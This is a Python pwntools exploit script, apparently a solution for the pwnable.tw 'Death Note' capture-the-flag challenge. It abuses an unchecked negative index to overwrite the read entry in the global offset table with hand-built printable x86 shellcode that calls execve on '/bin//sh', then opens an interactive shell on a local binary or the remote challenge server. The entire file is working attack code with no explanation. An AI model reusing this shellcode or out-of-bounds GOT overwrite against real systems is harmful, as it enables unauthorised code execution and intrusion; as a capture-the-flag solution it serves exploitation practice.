# pwnable.tw
# Death Note

from pwn import *

debug = True

def menu(choice):
	s.recvuntil('Your choice :')
	s.send(str(choice))

def add(idx, name):
	menu(1)
	s.recvuntil('Index :')
	s.send(str(idx))
	s.recvuntil('Name :')
	s.send(name)
	if debug:
		print "add finished"

def show(idx):
	menu(2)
	s.recvuntil('Index :')
	s.send(str(idx))
	s.recvuntil('Name : ')
	line = '-----------------------------------'
	re = s.recvuntil(line)
	if debug:
		print 'show finished'
	return re[:-(len(line)+1)]

def delete(idx):
	menu(3)
	s.recvuntil('Index :')
	s.send(idx)
	if debug:
		print 'delete finished'

def exit():
	menu(4)
	if debug:
		print 'exit finished'

def exploit():
	note = 0x0804A060
	read_got = 0x0804A00C

	shellcode = '\x25\x40\x40\x40\x40'		# and    eax,0x40404040
	shellcode += '\x25\x20\x20\x20\x20'		# and    eax,0x20202020
	shellcode += '\x50'						# push   eax
	shellcode += '\x68\x2f\x2f\x73\x68'		# push   0x68732f2f
	shellcode += '\x68\x2f\x62\x69\x6e'		# push   0x6e69622f
	shellcode += '\x54'						# push   esp
	shellcode += '\x5b'						# pop    ebx
	shellcode += '\x25\x40\x40\x40\x40'		# and    eax,0x40404040
	shellcode += '\x25\x20\x20\x20\x20'		# and    eax,0x20202020
	shellcode += '\x50'						# push   eax
	shellcode += '\x50'						# push   eax
	shellcode += '\x59'						# pop    ecx
	shellcode += '\x5a'						# pop    edx

	shellcode += '\x68\x33\x33\x20\x20'		# push   0x20203333
	shellcode += '\x58'						# pop    eax
	shellcode += '\x66\x2d\x20\x4f'			# sub    ax,0x4f20
	shellcode += '\x66\x2d\x33\x50'			# sub    ax,0x5033	(eax = 0x333380cd)
	shellcode += '\x50'						# push   eax
	shellcode += '\x54'						# push   esp

	shellcode += '\x25\x40\x40\x40\x40'		# and    eax,0x40404040
	shellcode += '\x25\x20\x20\x20\x20'		# and    eax,0x20202020
	shellcode += '\x40' * 0xb				# inc    eax (* 0xb)
	shellcode += '\x50'						# push   eax
	shellcode += '\x58'						# pop    eax
	shellcode += ''
	shellcode += '\x00'

	print len(shellcode)

	idx = (read_got - note) / 4
	
	add(idx, shellcode)

if __name__ == '__main__':
	if debug:
		s = process('./death_note')
		pause()
	else:
		s = remote('chall.pwnable.tw', 10201)

	exploit()
	s.interactive()
	s.close()